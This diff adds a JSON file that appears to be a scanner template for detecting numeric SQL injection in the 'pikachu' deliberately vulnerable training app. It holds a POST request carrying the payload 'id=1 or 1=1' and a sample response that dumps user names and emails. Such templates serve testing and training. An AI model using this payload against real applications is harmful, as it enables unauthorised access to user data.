@@ -1,0 +1,36 @@
+{
+    "name": "pikachu",
+    "vuln": "数字型sql注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type":"1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/sqli/sqli_id.php",
+                "cookie": "",
+                "requestheader": {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+                    "Cache-Control": "max-age=0",
+                    "Connection": "keep-alive",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Length": "47",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+                    "Upgrade-Insecure-Requests": "1"
+                },
+                "requestbody": "id=1%20or%201%20=%201&submit=搜索"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "[+] 存在数字型sql注入",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<p class='notice'>hello,vince <br />your email is: vince@pikachu.com</p><p class='notice'>hello,allen <br />your email is: allen@pikachu.com</p><p class='notice'>hello,kobe <br />your email is: kobe@pikachu.com</p><p class='notice'>hello,grady <br />your email is: grady@pikachu.com</p><p class='notice'>hello,kevin <br />your email is: kevin@pikachu.com</p><p class='notice'>hello,lucy <br />your email is: lucy@pikachu.com</p><p class='notice'>hello,lili <br />your email is: lili@pikachu.com</p>"
+            }
+        }
+    }
+}
